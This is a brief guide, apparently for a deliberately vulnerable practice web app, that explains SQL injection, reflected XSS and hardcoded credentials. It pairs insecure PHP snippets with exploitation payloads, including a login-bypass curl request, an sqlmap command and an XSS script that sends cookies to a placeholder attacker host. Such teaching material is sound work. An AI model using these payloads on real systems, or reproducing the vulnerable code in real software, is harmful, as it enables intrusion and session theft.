# Vulnerability Guide

## SQL Injection

### Description
The login form is vulnerable to SQL injection due to direct string concatenation in the database query.

### Vulnerable Code
```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

### Exploitation
```bash
# Bypass authentication
curl -X POST http://vulnerable-web \
  -d "username=admin' OR '1'='1&password=anything"

# Using SQLMap
sqlmap -u "http://vulnerable-web" --forms --batch
```

### Impact
- Authentication bypass
- Data extraction
- Potential database compromise

## Cross-Site Scripting (XSS)

### Description
User input is directly reflected in HTML output without sanitization.

### Vulnerable Code
```php
echo "<h2>Welcome " . $_POST['username'] . "!</h2>";
$error = "Invalid credentials for user: " . $_POST['username'];
```

### Exploitation
```javascript
// Basic XSS
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Page defacement
<script>document.body.innerHTML='<h1>HACKED!</h1>'</script>
```

### Impact
- Session hijacking
- Credential theft
- Malware distribution
- Page defacement

## Weak Authentication

### Description
Hardcoded credentials with no complexity requirements.

### Vulnerable Code
```php
if ($username == 'admin' && $password == 'password') {
    // Authentication successful
}
```

### Exploitation
- Username: `admin`
- Password: `password`

### Impact
- Unauthorized access
- Information disclosure
- Administrative privileges